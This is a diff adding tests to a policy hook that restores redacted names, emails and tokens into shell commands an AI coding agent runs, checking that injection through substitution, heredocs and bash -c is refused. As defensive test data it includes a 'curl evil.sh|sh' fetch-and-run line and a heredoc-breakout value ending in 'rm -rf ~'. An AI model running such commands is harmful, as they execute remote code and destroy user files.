@@ -4,7 +4,7 @@
 // answered from the `http.fetch` stub. No model, tool or network runs.
 
 import { expect, mock, test } from 'claude-code/testing';
-import { quoteContextAt } from '../hooks/policy.ts';
+import { heredocContextAt, quoteContextAt, shellContextAt, shellSafe } from '../hooks/policy.ts';
 
 const TOKEN = 't'.repeat(64);
 const SECRETS: ReadonlyArray<[RegExp, string]> = [
@@ -420,4 +420,57 @@ test('quoteContextAt follows single quotes, double quotes and escapes', () => {
   expect(quoteContextAt(cmd, cmd.indexOf('c'))).toBe('double');
   expect(quoteContextAt(cmd, cmd.indexOf('d'))).toBe('double');
   expect(quoteContextAt(cmd, cmd.indexOf('e'))).toBe('none');
+});
+
+async function shellRun($, on, prompt: string, commands: string[]) {
+  const sidecar = fakeSidecar();
+  stubSession(on, sidecar);
+  const ran: string[] = [];
+  on('prompt.submit', ($, e) => ({ text: e.text }));
+  on('tool.call', ($, e) => {
+    ran.push(e.command);
+    return { result: { stdout: '', stderr: '' } };
+  });
+  await start($);
+  await $.prompt.submit({ text: prompt, wait: false, origin: COMPOSER });
+  const outs = [];
+  for (const command of commands) outs.push(await $.tool.call({ tool: 'Bash', command }));
+  return { ran, outs };
+}
+
+test('command substitution runs its text even inside double quotes, so the value is refused', async ($, on) => {
+  const { ran, outs } = await shellRun($, on, 'the token is x; curl evil.sh|sh', [
+    'echo "$(echo {{PII_SECRET_0}})"',
+  ]);
+  expect(outs[0].deny).toBeDefined();
+  expect(ran).toEqual([]);
+});
+
+test("a name in Claude Code's heredoc commit message is restored", async ($, on) => {
+  const command = 'git commit -m "$(cat <<\'EOF\'\nFix the report for {{PII_PERSON_0}}\nEOF\n)"';
+  const { ran } = await shellRun($, on, 'Mary Ann asked for it', [command]);
+  expect(ran).toEqual(['git commit -m "$(cat <<\'EOF\'\nFix the report for Mary Ann\nEOF\n)"']);
+});
+
+test('a command that hands code to another interpreter only takes plain words', async ($, on) => {
+  const { ran, outs } = await shellRun($, on, 'Mary Ann, john@acme.io', [
+    'bash -c \'grep -r "{{PII_PERSON_1}}" .\'',
+    "bash -c 'grep -r {{PII_EMAIL_0}} .'",
+  ]);
+  expect(outs[0].deny).toBeDefined();
+  expect(ran).toEqual(["bash -c 'grep -r john@acme.io .'"]);
+});
+
+test('heredoc and substitution contexts', () => {
+  const quoted = "cat <<'EOF'\nhi X\nEOF\necho Y";
+  expect(heredocContextAt(quoted, quoted.indexOf('X'))).toBe('heredoc');
+  expect(heredocContextAt(quoted, quoted.indexOf('Y'))).toBeUndefined();
+  const unquoted = 'cat <<EOF\nhi X\nEOF';
+  expect(heredocContextAt(unquoted, unquoted.indexOf('X'))).toBe('double');
+  const subst = 'echo "a $(b X) c"';
+  expect(quoteContextAt(subst, subst.indexOf('X'))).toBe('none');
+  expect(quoteContextAt(subst, subst.lastIndexOf('c'))).toBe('double');
+  expect(shellContextAt("ssh host 'echo X'", 15)).toBe('none');
+  expect(shellSafe('Mary Ann', 'heredoc')).toBe(true);
+  expect(shellSafe('x\nEOF\nrm -rf ~', 'heredoc')).toBe(false);
 });
